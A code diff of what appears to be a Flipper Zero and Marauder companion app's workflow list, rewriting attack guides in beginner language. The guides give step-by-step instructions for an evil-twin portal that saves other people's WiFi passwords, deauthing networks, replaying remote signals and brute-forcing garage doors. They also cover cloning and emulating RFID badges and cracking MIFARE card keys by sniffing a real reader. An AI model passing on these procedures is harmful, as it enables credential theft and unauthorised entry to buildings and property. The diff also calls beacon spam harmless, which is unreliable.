-                        "Match SSID exactly including capitalization and spaces",
-                        "Victims see 'known network' and auto-connect",
-                        "Deauth target network simultaneously to push clients to your portal"
+                        "The AWOK creates a new WiFi network with the same name",
+                        "Optional: at the same time, run deauth on the real network to push people off it"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Wait for Credentials",
-                    description = "When victims connect, browser redirects to fake login page. Any entered credentials are saved.",
+                    title = "Wait for Connections",
+                    description = "Devices will try to connect to what they think is the real network. Their browsers will automatically open the fake login page. The page looks like a router config page asking for WiFi password.",
                     tips = listOf(
-                        "Creds saved to /apps_data/marauder/ on Flipper SD",
-                        "Page mimics router admin or ISP login"
+                        "Anything they type gets saved automatically",
+                        "Credentials are stored at: apps_data/marauder/ on Flipper SD card"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Retrieve Captured Credentials",
-                    description = "Connect Flipper via USB and read credential log from SD card.",
-                    commands = listOf(
-                        Command("PCAP path", "/apps_data/marauder/", Device.FLIPPER_CLI)
-                    )
-                )
-            )
-        ),
-
-        Workflow(
-            id = "wifi_beacon_spam",
-            title = "Beacon Spam — Flood SSIDs",
-            subtitle = "Flood nearby devices with hundreds of fake WiFi network names",
-            categoryId = "wifi",
-            hardware = listOf(Hardware.AWOK),
-            prerequisites = listOf("AWOK Dual Mini v3 with Marauder"),
-            steps = listOf(
-                WorkflowStep(
-                    stepNumber = 1,
-                    title = "Launch Marauder",
-                    description = "Open the ESP32 WiFi Marauder app on Flipper.",
-                    commands = listOf(
-                        Command("Launch", "Apps > GPIO > [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 2,
-                    title = "Start Beacon Spam",
-                    description = "Floods area with hundreds of fake SSID beacons. Fills WiFi networks list on all nearby devices.",
-                    commands = listOf(
-                        Command("Beacon spam", "attack -t beacon", Device.MARAUDER)
-                    ),
-                    tips = listOf(
-                        "Creates ~100+ fake SSIDs with random names",
-                        "Can cause WiFi scanning to slow or crash on some devices",
-                        "Use custom SSID list for targeted spam"
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 3,
-                    title = "Stop Attack",
-                    description = "Stop the beacon spam attack.",
+                    title = "Retrieve the Captured Data",
+                    description = "Type 'stopscan' to stop the portal. Connect Flipper to your phone via USB. Go to Flipper storage → apps_data → marauder → you'll find a text file with any captured credentials.",
                     commands = listOf(
                         Command("Stop", "stopscan", Device.MARAUDER)
                     )
@@ -529,50 +442,87 @@ object WorkflowRepository {
         ),
 
         Workflow(
-            id = "subghz_read_replay",
-            title = "Read & Replay Fixed-Code Remote",
-            subtitle = "Capture and replay RF signals from remotes and keyfobs",
-            categoryId = "subghz",
-            hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Target remote or keyfob"),
+            id = "wifi_beacon_spam",
+            title = "Flood Area with Fake WiFi Names",
+            subtitle = "Create hundreds of fake WiFi networks to spam everyone nearby",
+            categoryId = "wifi",
+            hardware = listOf(Hardware.AWOK, Hardware.FLIPPER),
+            prerequisites = listOf("AWOK with Marauder", "Flipper with WiFi Marauder app"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Open Sub-GHz",
-                    description = "On Flipper: Main Menu > Sub-GHz",
+                    title = "Open Marauder on Flipper",
+                    description = "On Flipper: Apps → GPIO → [ESP32] WiFi Marauder",
                     commands = listOf(
-                        Command("Navigate", "Main Menu > Sub-GHz", Device.FLIPPER_CLI)
+                        Command("Open app", "Apps → GPIO → [ESP32] WiFi Marauder", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Read Signal",
-                    description = "Select 'Read'. Hold Flipper near remote and press button on remote. Flipper auto-detects frequency and protocol.",
+                    title = "Start Beacon Spam",
+                    description = "Type 'attack -t beacon' and press Send. The AWOK immediately starts broadcasting around 100 fake WiFi network names. Anyone nearby opens their WiFi settings and sees a huge confusing list of random network names.",
                     commands = listOf(
-                        Command("Read", "Sub-GHz > Read", Device.FLIPPER_CLI)
+                        Command("Beacon spam", "attack -t beacon", Device.MARAUDER)
                     ),
                     tips = listOf(
-                        "Flipper shows: frequency, protocol, key value",
-                        "Common: 433.92 MHz AM650, 315 MHz AM650",
-                        "Works for: garage gates, doorbells, RF outlets, car alarms (older)"
+                        "This is harmless — it just creates fake advertisements, no real networks",
+                        "Other people's WiFi still works fine — just looks messy in their settings"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Save Signal",
-                    description = "Press OK to save. Name the signal.",
-                    tips = listOf("Good name: 'Garage_Door_Main' or 'Gate_Front'")
+                    title = "Stop Whenever You Want",
+                    description = "Type 'stopscan' to stop. All the fake networks disappear from everyone's WiFi list immediately.",
+                    commands = listOf(
+                        Command("Stop", "stopscan", Device.MARAUDER)
+                    )
+                )
+            )
+        ),
+
+        // ── SUB-GHZ ────────────────────────────────────────────────────────────
+
+        Workflow(
+            id = "subghz_read_replay",
+            title = "Copy and Replay a Remote Control",
+            subtitle = "Record any RF remote and replay it from your Flipper",
+            categoryId = "subghz",
+            hardware = listOf(Hardware.FLIPPER),
+            prerequisites = listOf("Flipper Zero", "A remote control you want to copy"),
+            steps = listOf(
+                WorkflowStep(
+                    stepNumber = 1,
+                    title = "Open Sub-GHz on Flipper",
+                    description = "Press the middle button on Flipper. Scroll to 'Sub-GHz'. Press OK. This is where all the radio magic happens.",
+                    commands = listOf(
+                        Command("Open menu", "Main Menu → Sub-GHz", Device.FLIPPER_CLI)
+                    ),
+                    tips = listOf("Sub-GHz = radio signals below 1 GHz (like 433 MHz, 315 MHz, 868 MHz)")
+                ),
+                WorkflowStep(
+                    stepNumber = 2,
+                    title = "Start Reading",
+                    description = "Scroll to 'Read' and press OK. Flipper is now listening for radio signals. Point your remote at the Flipper (Flipper doesn't need to face it — just be within arm's reach). Press the button on your remote.",
+                    commands = listOf(
+                        Command("Start read", "Sub-GHz → Read", Device.FLIPPER_CLI)
+                    ),
+                    tips = listOf(
+                        "Works on: gate remotes, old garage door openers, RF doorbells, remote outlets, alarm keyfobs",
+                        "When Flipper receives it, you'll see: frequency, protocol name, and the key code"
+                    )
+                ),
+                WorkflowStep(
+                    stepNumber = 3,
+                    title = "Save What You Captured",
+                    description = "After Flipper shows the signal info, press OK to save it. Type a name for it (like 'Front_Gate' or 'Garage') and press OK.",
+                    tips = listOf("Use a name that helps you remember what it does")
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Replay Signal",
-                    description = "Sub-GHz > Saved > select saved signal > Send",
+                    title = "Send the Signal",
+                    description = "To replay it: Sub-GHz → Saved → scroll to your saved signal → press OK → scroll to 'Send' → press OK.\n\nPoint your Flipper at the receiver (like the gate box or doorbell). It will trigger just like the real remote.",
                     commands = listOf(
-                        Command("Send", "Sub-GHz > Saved > [name] > Send", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "Point Flipper at receiver, press Send",
-                        "Hold Send for continuous transmission"
+                        Command("Replay saved signal", "Sub-GHz → Saved → [your signal] → Send", Device.FLIPPER_CLI)
                     )
                 )
             )
@@ -580,69 +530,52 @@ object WorkflowRepository {
 
         Workflow(
             id = "subghz_brute_garage",
-            title = "Brute Force Fixed-Code Garage Door",
-            subtitle = "Cycle through all possible codes to open older garage doors",
+            title = "Open an Older Garage Door (Brute Force)",
+            subtitle = "Cycle through all codes to find one that opens a fixed-code garage door",
             categoryId = "subghz",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero with community apps", "Sub-GHz Bruteforcer app installed", "Fixed-code garage door system"),
+            prerequisites = listOf("Flipper Zero with Momentum firmware", "Sub-GHz Bruteforcer app installed on Flipper"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Identify Door System",
-                    description = "Read the remote label to identify brand and system age. Fixed-code systems: Came, Nice, BFT, Tedsen, Chamberlain/LiftMaster pre-2011, Genie pre-2005.",
-                    tips = listOf(
-                        "Post-2011 Chamberlain/LiftMaster: rolling code, cannot brute force",
-                        "Look for 'Security+' or 'Security+ 2.0' = rolling code"
-                    )
+                    title = "Does This Work on Your Door?",
+                    description = "This ONLY works on older 'fixed code' garage doors. Modern doors have 'rolling codes' which change every press.\n\nFixed code brands (usually work): CAME, Nice, BFT, Tedsen, Genie (pre-2005), Chamberlain/LiftMaster (pre-2011)\nRolling code (WON'T work): Any door labeled 'Security+', 'Security+ 2.0', 'myQ'\n\nLook at your remote — if it says 'Security+', it's rolling code and this method won't work.",
+                    warning = "Only attempt on your own property"
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Open Bruteforcer App",
-                    description = "Flipper: Apps > Sub-GHz > Sub-GHz Bruteforcer (community app)",
-                    tips = listOf(
-                        "If not installed: download .fap from github.com/derskythe/flipperzero-firmware-derskythe",
-                        "Or find in community app catalog"
+                    title = "Install the Bruteforcer App",
+                    description = "On Flipper, go to Apps → Sub-GHz → Sub-GHz Bruteforcer.\n\nIf it's not there: connect Flipper to phone → open Flipper app → Apps Store → search 'Bruteforcer' → install the Sub-GHz Bruteforcer app.",
+                    commands = listOf(
+                        Command("Open app", "Apps → Sub-GHz → Sub-GHz Bruteforcer", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Select Protocol",
-                    description = "Choose protocol matching your door brand.",
-                    tips = listOf(
-                        "CAME 12bit — CAME, BFT brands",
-                        "Nice Flo — Nice, Hörmann brands",
-                        "Chamberlain — pre-2011 LiftMaster",
-                        "Linear — common US brands"
-                    )
+                    title = "Pick the Right Protocol",
+                    description = "In the Bruteforcer app, scroll to your door brand:\n• CAME (12-bit) — for CAME and BFT doors\n• Nice Flo — for Nice brand doors\n• Chamberlain — for pre-2011 LiftMaster/Chamberlain\n• Linear — common in USA\n\nIf you don't know the brand, try them in order.",
+                    tips = listOf("The most common US brand is Chamberlain/LiftMaster")
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Select Frequency",
-                    description = "Choose correct frequency:",
-                    tips = listOf(
-                        "315 MHz — North America (most garage doors)",
-                        "433.92 MHz — Europe",
-                        "868 MHz — some European systems"
-                    )
+                    title = "Pick the Frequency",
+                    description = "Select the frequency:\n• 315 MHz — most North American garage doors\n• 433.92 MHz — European doors\n• 868 MHz — some European systems\n\nIf in doubt, try 315 MHz first (USA standard)."
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Generate De Bruijn Sequence",
-                    description = "Select '1 file (De Bruijn)' — generates optimized sequence that covers all codes in minimum transmissions.",
-                    tips = listOf(
-                        "De Bruijn: 12-bit = tries 4096 codes in ~4096 transmissions",
-                        "Much faster than sending each code separately"
-                    )
+                    title = "Generate the Code File",
+                    description = "Select '1 file (De Bruijn)'. This creates a special optimized sequence that tests ALL 4096 codes in the shortest possible time — like a master key that tries every combination at once.",
+                    tips = listOf("De Bruijn is the smart way — instead of sending codes one by one, it overlaps them so 4096 codes take way fewer transmissions")
                 ),
                 WorkflowStep(
                     stepNumber = 6,
-                    title = "Transmit and Wait",
-                    description = "Press 'Send'. Walk/stand near the door receiver. Transmission cycles through all codes automatically.",
-                    warning = "Only perform on your own property",
+                    title = "Stand Near the Door and Transmit",
+                    description = "Stand within 5-10 feet of the garage door's receiver (the box on the ceiling). Press 'Send' on Flipper. Hold Flipper pointing at the receiver. The Flipper cycles through all codes automatically — your garage door will open when the right code is sent.",
+                    warning = "Only test on your own garage door",
                     tips = listOf(
-                        "12-bit: ~2-5 minutes",
-                        "Stay within 10m of receiver for best range",
-                        "Some doors need 2+ passes"
+                        "12-bit sequence takes about 2-4 minutes to complete",
+                        "If it doesn't open in one pass, try a second pass",
+                        "Closer = better, try to be within 10 feet"
                     )
                 )
             )
@@ -650,146 +583,140 @@ object WorkflowRepository {
 
         Workflow(
             id = "subghz_raw",
-            title = "RAW Sub-GHz Capture & Analysis",
-            subtitle = "Capture raw RF signals for unknown protocols and rolling codes",
+            title = "Record Unknown RF Signals (RAW Mode)",
+            subtitle = "Capture raw radio signals from devices with unknown protocols",
             categoryId = "subghz",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Universal Radio Hacker on PC (optional)"),
+            prerequisites = listOf("Flipper Zero"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Enter RAW Read Mode",
-                    description = "Sub-GHz > Read RAW — captures raw signal without protocol decoding.",
-                    commands = listOf(
-                        Command("RAW Read", "Sub-GHz > Read RAW", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "Use for unknown protocols",
-                        "Also captures rolling codes for offline analysis"
-                    )
+                    title = "When to Use RAW Mode",
+                    description = "Regular 'Read' mode only captures signals it recognizes. RAW mode records EVERYTHING as raw waveform data — like recording audio vs. transcribing words. Use RAW for:\n• Unknown brand remotes\n• Alarm sensors\n• Industrial equipment\n• Rolling code remotes (for analysis)",
+                    tips = listOf("RAW files are bigger but capture everything")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Set or Detect Frequency",
-                    description = "If you know the frequency, set it manually. Otherwise use 'Frequency Analyzer' first.",
+                    title = "Find the Frequency First",
+                    description = "Go to Sub-GHz → Frequency Analyzer. Point your remote at Flipper and press the button. You'll see a spike at the frequency the remote uses. Write that number down.",
                     commands = listOf(
-                        Command("Frequency Analyzer", "Sub-GHz > Frequency Analyzer", Device.FLIPPER_CLI)
+                        Command("Open frequency analyzer", "Sub-GHz → Frequency Analyzer", Device.FLIPPER_CLI)
                     ),
-                    tips = listOf("Point Flipper near transmitter, press buttons — analyzer shows active frequency")
+                    tips = listOf("Common frequencies: 315 MHz, 433.92 MHz, 868 MHz")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Capture Signal",
-                    description = "Press OK to start capture. Trigger your remote. Press OK to stop.",
-                    tips = listOf("Captures full signal waveform as .sub file")
-                ),
-                WorkflowStep(
-                    stepNumber = 4,
-                    title = "Analyze on PC with URH",
-                    description = "Copy .sub file to PC. Open in Universal Radio Hacker (URH).",
+                    title = "Switch to RAW Read Mode",
+                    description = "Go back: Sub-GHz → Read RAW. If you know the frequency, set it manually. Otherwise leave it on Auto.",
                     commands = listOf(
-                        Command("Analyze", "URH: github.com/jopohl/urh", Device.PC)
-                    ),
-                    tips = listOf(
-                        "URH decodes modulation, protocol, bit values",
-                        "Can convert RAW to proper protocol format"
+                        Command("Open RAW mode", "Sub-GHz → Read RAW", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
+                    stepNumber = 4,
+                    title = "Capture the Signal",
+                    description = "Press OK to start recording. Press the button on your remote. Press OK to stop recording. The RAW waveform is saved as a .sub file.",
+                    tips = listOf("The signal gets saved even if Flipper doesn't know what protocol it is")
+                ),
+                WorkflowStep(
                     stepNumber = 5,
-                    title = "Replay RAW Signal",
-                    description = "Sub-GHz > Saved > select RAW file > Send. Replays raw waveform.",
+                    title = "Replay the RAW Signal",
+                    description = "Sub-GHz → Saved → find your RAW file → Send.\n\nThis plays back the exact raw waveform. Often works even without knowing the protocol.",
+                    commands = listOf(
+                        Command("Replay RAW", "Sub-GHz → Saved → [RAW file] → Send", Device.FLIPPER_CLI)
+                    ),
                     tips = listOf(
-                        "RAW replay works even if protocol is unknown",
-                        "Rolling codes: RAW replay may work once if code not yet used"
+                        "For rolling codes: RAW replay might work one time if the captured code hasn't been used yet",
+                        "For analysis: copy the .sub file to PC and open in Universal Radio Hacker (free tool)"
                     )
                 )
             )
         ),
 
+        // ── RFID ───────────────────────────────────────────────────────────────
+
         Workflow(
             id = "rfid_read",
-            title = "Read 125kHz RFID Card/Fob",
-            subtitle = "Read EM4100, HID Prox, and other 125kHz RFID credentials",
+            title = "Read an RFID Access Card or Key Fob",
+            subtitle = "Capture the data from any 125kHz RFID badge",
             categoryId = "rfid",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Target RFID card or keyfob"),
+            prerequisites = listOf("Flipper Zero", "An RFID card or key fob (the flat ones with just a chip inside)"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Open 125kHz RFID",
-                    description = "Navigate to the RFID module on Flipper.",
+                    title = "Open 125 kHz RFID",
+                    description = "Press Flipper's middle button. Scroll down to '125 kHz RFID'. Press OK.\n\n(Note: NFC is a different menu — 125 kHz RFID is for older building access cards. If your card works by just waving it near a reader, it's probably this type.)",
                     commands = listOf(
-                        Command("Navigate", "Main Menu > 125 kHz RFID", Device.FLIPPER_CLI)
-                    )
+                        Command("Open menu", "Main Menu → 125 kHz RFID", Device.FLIPPER_CLI)
+                    ),
+                    tips = listOf("125 kHz = thicker plastic cards and chunky key fobs used for doors and parking")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Read Card or Fob",
-                    description = "Select 'Read'. Hold card/fob flat against Flipper's back (center). Hold steady.",
+                    title = "Press Read",
+                    description = "Scroll to 'Read' and press OK. Flipper is now scanning.",
                     commands = listOf(
-                        Command("Read", "125 kHz RFID > Read", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "Card must be within 5cm of antenna",
-                        "EM4100/EM410x: reads in <1 second",
-                        "HID Prox: hold directly against card, may take 2-3 seconds",
-                        "Move slightly if no read after 5 seconds"
+                        Command("Start reading", "125 kHz RFID → Read", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "View Card Data",
-                    description = "Flipper shows: Card type, Facility Code, Card Number, Full UID",
+                    title = "Hold the Card Against Flipper",
+                    description = "Place your card FLAT on the BACK of your Flipper Zero. The antenna is on the back — the card needs to be centered there. Hold it completely still.",
                     tips = listOf(
-                        "EM4100: shows 5-byte (40-bit) unique ID",
-                        "HID Prox: shows Facility Code (FC) and Card Number (CN) — same fields used in access control system"
+                        "If nothing happens after 5 seconds, slide the card around slightly",
+                        "HID Prox cards (office building fobs) need to be pressed REALLY close — like touching the back",
+                        "EM4100 cards (most common type) read almost instantly"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Save Card",
-                    description = "Press OK to save. Name descriptively.",
-                    tips = listOf("Name: 'Office_Badge_Main' or 'Front_Door_Fob'")
+                    title = "See What Flipper Found",
+                    description = "When the card is read, Flipper shows:\n• Card type (EM4100, HID Prox, Indala, etc.)\n• A unique number (the UID)\n• Facility Code and Card Number (for building access cards)\n\nThis is the identity of your card.",
+                    tips = listOf("The UID is unique to your card — like a fingerprint")
+                ),
+                WorkflowStep(
+                    stepNumber = 5,
+                    title = "Save It",
+                    description = "Press OK and type a name. Something descriptive like 'Work_Badge' or 'Gym_Key'. Press OK to save.",
+                    tips = listOf("You can now emulate or clone this card from the Saved menu")
                 )
             )
         ),
 
         Workflow(
             id = "rfid_emulate",
-            title = "Emulate RFID Card (Badge Bypass)",
-            subtitle = "Use Flipper to impersonate a cloned 125kHz access card",
+            title = "Use Flipper as Your Access Card",
+            subtitle = "Make Flipper pretend to be any saved RFID badge",
             categoryId = "rfid",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Saved RFID card in Flipper"),
+            prerequisites = listOf("Flipper Zero", "A saved RFID card in Flipper (read it first)"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Read Card",
-                    description = "Read target card first (or use manually entered UID).",
+                    title = "Go to Your Saved Cards",
+                    description = "From the main menu: 125 kHz RFID → Saved. You'll see a list of all the cards you've read. Scroll to the one you want to use.",
                     commands = listOf(
-                        Command("Read", "125 kHz RFID > Read", Device.FLIPPER_CLI)
+                        Command("Open saved cards", "125 kHz RFID → Saved", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Emulate the Card",
-                    description = "125 kHz RFID > Saved > select saved card > Emulate. Flipper now acts as that card.",
+                    title = "Start Emulation",
+                    description = "Tap the card name. Scroll to 'Emulate'. Press OK. Flipper is now broadcasting as that card. Your Flipper IS the card right now.",
                     commands = listOf(
-                        Command("Emulate", "125 kHz RFID > Saved > [name] > Emulate", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "Hold Flipper to reader exactly as you would hold the card",
-                        "Keep still — movement during read can fail"
+                        Command("Emulate card", "125 kHz RFID → Saved → [card name] → Emulate", Device.FLIPPER_CLI)
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Test at Reader",
-                    description = "Hold Flipper to card reader. Light should change to green / door should unlock.",
+                    title = "Hold Flipper to the Reader",
+                    description = "Hold the BACK of your Flipper against the card reader exactly the same way you'd hold the real card. Keep it still for 1-2 seconds. The reader should beep green.",
                     tips = listOf(
-                        "If fails: try different orientation (flip Flipper over)",
-                        "Some HID readers: hold Flipper very close, almost touching"
+                        "If it beeps red: try flipping Flipper around (other orientation)",
+                        "If still failing: try pressing Flipper really close to the reader",
+                        "Some readers are strict about distance — go as close as possible"
                     )
                 )
             )
@@ -797,311 +724,208 @@ object WorkflowRepository {
 
         Workflow(
             id = "rfid_clone",
-            title = "Clone RFID Card to T5577 Blank",
-            subtitle = "Write a cloned credential to a writable T5577 blank card",
+            title = "Make a Physical Copy of an RFID Card",
+            subtitle = "Write a cloned card ID to a blank T5577 card",
             categoryId = "rfid",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "T5577 blank keyfob or card"),
+            prerequisites = listOf("Flipper Zero", "T5577 blank card or fob (buy on Amazon for about $1 each)"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Read Original Card",
-                    description = "Read and save the original card you want to clone.",
-                    commands = listOf(
-                        Command("Read", "125 kHz RFID > Read", Device.FLIPPER_CLI)
-                    )
+                    title = "Read the Original Card First",
+                    description = "Before cloning, you need to read and save the original card. Follow the 'Read an RFID Access Card' workflow above. Come back here once it's saved.",
+                    tips = listOf("The card needs to be in your Saved list before you can clone it")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Save Card Data",
-                    description = "Save the read card data with a descriptive name."
-                ),
-                WorkflowStep(
-                    stepNumber = 3,
-                    title = "Get T5577 Blank Cards",
-                    description = "Purchase T5577 blank keyfobs or cards. These are universal blank 125kHz cards that can be written with any protocol.",
+                    title = "Get a T5577 Blank Card",
+                    description = "You need a 'T5577 blank RFID card' (also sold as EM4305 blanks). Search Amazon for 'T5577 RFID blank cards'. A pack of 10 costs about $8. They look like regular access cards but are totally empty.",
                     tips = listOf(
-                        "Available on Amazon/eBay: 'T5577 RFID blank card'",
-                        "Also called 'EM4305' — same thing",
-                        "Get keyfob format to attach to keyring"
+                        "Get the keyfob format if you want to put it on a keyring",
+                        "Works with EM4100, HID, and most other 125kHz card types"
                     )
                 ),
                 WorkflowStep(
-                    stepNumber = 4,
-                    title = "Write to T5577",
-                    description = "125 kHz RFID > Saved > select card > Write. Hold T5577 blank card against Flipper back.",
+                    stepNumber = 3,
+                    title = "Write to the Blank Card",
+                    description = "Go to: 125 kHz RFID → Saved → your card → press OK → scroll to 'Write' → press OK.\n\nNow put the blank T5577 card flat on the BACK of your Flipper. Hold it very still. Flipper will vibrate when the write is complete.",
                     commands = listOf(
-                        Command("Write", "125 kHz RFID > Saved > [name] > Write", Device.FLIPPER_CLI)
+                        Command("Write to blank card", "125 kHz RFID → Saved → [card] → Write", Device.FLIPPER_CLI)
                     ),
                     tips = listOf(
-                        "Hold T5577 still for 3-5 seconds during write",
-                        "Flipper vibrates on success",
-                        "Test clone at reader immediately after"
+                        "Flipper vibrates = success!",
+                        "Test the clone right away at the reader to confirm it works"
                     )
                 )
             )
         ),
 
-        Workflow(
-            id = "rfid_fuzz",
-            title = "RFID Brute Force Access",
-            subtitle = "Cycle through all RFID codes to find an accepted credential",
-            categoryId = "rfid",
-            hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Physical access to card reader"),
-            steps = listOf(
-                WorkflowStep(
-                    stepNumber = 1,
-                    title = "Open RFID Fuzz",
-                    description = "125 kHz RFID > Fuzz — cycles through EM4100 cards sequentially",
-                    commands = listOf(
-                        Command("Fuzz", "125 kHz RFID > Fuzz", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "Sends all facility code + card number combinations",
-                        "May trigger alarms on monitored systems — know your target"
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 2,
-                    title = "Select Protocol",
-                    description = "Choose EM4100 or HID. EM4100 most common.",
-                    tips = listOf(
-                        "EM4100: most older systems",
-                        "HID 26bit: most common US commercial buildings"
-                    )
-                ),
-                WorkflowStep(
-                    stepNumber = 3,
-                    title = "Position and Run",
-                    description = "Hold Flipper at reader distance and let it cycle. Door opens when matching code is sent."
-                )
-            )
-        ),
+        // ── NFC ────────────────────────────────────────────────────────────────
 
         Workflow(
             id = "nfc_read_mifare",
-            title = "Read & Clone MIFARE Classic Card",
-            subtitle = "Dump and clone an encrypted MIFARE Classic 1K/4K access card",
+            title = "Read and Clone a NFC Access Card",
+            subtitle = "Crack and clone MIFARE Classic cards (hotel, parking, elevator)",
             categoryId = "nfc",
             hardware = listOf(Hardware.FLIPPER),
-            prerequisites = listOf("Flipper Zero", "Target MIFARE Classic card", "Magic Gen1a card for clone (optional)"),
+            prerequisites = listOf("Flipper Zero", "Target NFC card", "For physical clone: Magic Gen1a NFC card (buy on Amazon)"),
             steps = listOf(
                 WorkflowStep(
                     stepNumber = 1,
-                    title = "Open NFC",
-                    description = "Navigate to the NFC module on Flipper.",
-                    commands = listOf(
-                        Command("Navigate", "Main Menu > NFC", Device.FLIPPER_CLI)
-                    )
+                    title = "What Kind of Card Is It?",
+                    description = "This guide is for NFC cards — the thin plastic cards that work at high-tech readers (hotel rooms, elevators, modern office doors). They're different from 125kHz RFID:\n• If it's a thin hotel keycard → probably MIFARE Classic (this guide)\n• If it's a thick fob → probably 125kHz RFID (different guide)\n• Contactless bank cards → can read but cannot clone (too secure)",
+                    tips = listOf("Still not sure? Try NFC → Read on Flipper — it'll tell you what type it is")
                 ),
                 WorkflowStep(
                     stepNumber = 2,
-                    title = "Read Card",
-                    description = "NFC > Read. Hold card flat against Flipper back (top area). Flipper auto-detects type.",
+                    title = "Open NFC and Read",
+                    description = "Press Flipper's middle button → scroll to 'NFC' → press OK → press OK on 'Read'. Now hold your NFC card flat on the BACK of Flipper (top area, near where the NFC label would be).",
                     commands = listOf(
-                        Command("Read", "NFC > Read", Device.FLIPPER_CLI)
+                        Command("Start reading", "NFC → Read", Device.FLIPPER_CLI)
                     ),
-                    tips = listOf(
-                        "MIFARE Classic 1K/4K most common",
-                        "Flipper tries 1241 built-in dictionary keys automatically",
-                        "Progress bar shows sector-by-sector decryption"
-                    )
+                    tips = listOf("Hold the card very still for 3-5 seconds")
                 ),
                 WorkflowStep(
                     stepNumber = 3,
-                    title = "Handle Partial Read",
-                    description = "If some sectors show '?????' — need to extract those keys using mfkey32.",
-                    tips = listOf(
-                        "This is normal for cards with non-default keys",
-                        "Need to use 'Detect Reader' trick"
-                    )
+                    title = "Flipper Tries to Crack It Automatically",
+                    description = "Flipper has 1,241 built-in passwords baked in. It tries ALL of them automatically in a few seconds. You'll see a progress bar scanning through the card's sectors.\n\n✅ If all sectors turn green — full read! Save it and you're done.\n⚠️ If some sectors show '?????' — you need the next steps to get the missing keys.",
+                    tips = listOf("Most common hotel keycards get fully read on the first try")
                 ),
                 WorkflowStep(
                     stepNumber = 4,
-                    title = "Detect Reader Attack",
-                    description = "NFC > Detect Reader. Hold Flipper near the actual card reader used by target system. Reader sends authentication attempts — Flipper captures these nonces.",
+                    title = "Get Missing Keys with Detect Reader",
+                    description = "For any '?????' sectors: Go to NFC → Detect Reader. Then go to the REAL card reader (the one that accepts this card) and hold your Flipper where the card goes. The reader tries to authenticate with Flipper, and Flipper secretly records those authentication attempts.",
                     commands = listOf(
-                        Command("Detect Reader", "NFC > Detect Reader", Device.FLIPPER_CLI)
+                        Command("Detect reader attack", "NFC → Detect Reader", Device.FLIPPER_CLI)
                     ),
                     tips = listOf(
-                        "Hold Flipper where card normally goes on reader",
-                        "Wait for reader to attempt auth (may beep)",
-                        "Flipper saves captured nonces to file"
+                        "You might need to do this 2-3 times near the same reader",
+                        "The reader will usually beep or reject it — that's fine, Flipper already got what it needed"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 5,
-                    title = "Extract Keys with mfkey32",
-                    description = "Open Flipper mobile app > Tools > mfkey32. This brute-forces the sector keys from the captured nonces.",
+                    title = "Extract the Keys on Your Phone",
+                    description = "Open the Flipper Mobile App on your phone. Go to Tools → Mfkey32. Tap 'Calculate'. The app looks at the captured authentication data and figures out the secret keys. This takes 1-3 minutes.",
                     tips = listOf(
-                        "Takes 30-120 seconds on phone",
-                        "Recovered keys added to Flipper dictionary automatically"
+                        "The recovered keys get saved to Flipper automatically",
+                        "These keys work for any card from the same access control system"
                     )
                 ),
                 WorkflowStep(
                     stepNumber = 6,
-                    title = "Add Keys to Dictionary",
-                    description = "Add recovered keys to extended dictionary for future reads.",
-                    commands = listOf(
-                        Command("Dict path", "/ext/nfc/assets/mf_classic_dict_user.txt", Device.FLIPPER_CLI)
-                    ),
-                    tips = listOf(
-                        "Also add community dict: Proxmark3 MIFARE dict has thousands of known keys"
-                    )
+                    title = "Read the Card Again",
+                    description = "Go back to NFC → Read and hold the card on Flipper again. Now that Flipper knows the keys, all sectors should turn green. Save the complete card.",
+                    tips = listOf("If there are still '?????' sectors, do the Detect Reader step again with those specific sectors")
                 ),
                 WorkflowStep(
                     stepNumber = 7,
-                    title = "Re-Read with Expanded Dictionary",
